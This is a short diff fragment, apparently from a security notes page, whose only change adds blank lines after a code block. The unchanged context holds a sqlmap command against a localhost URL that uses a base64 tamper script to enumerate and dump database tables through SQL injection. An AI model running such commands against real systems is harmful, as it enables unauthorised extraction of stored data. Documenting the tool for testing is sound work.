@@ -14,3 +14,5 @@ updated_at: '2023-04-06T03:56:41.317845+00:00'
 ```python
 sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
 ```
+
+
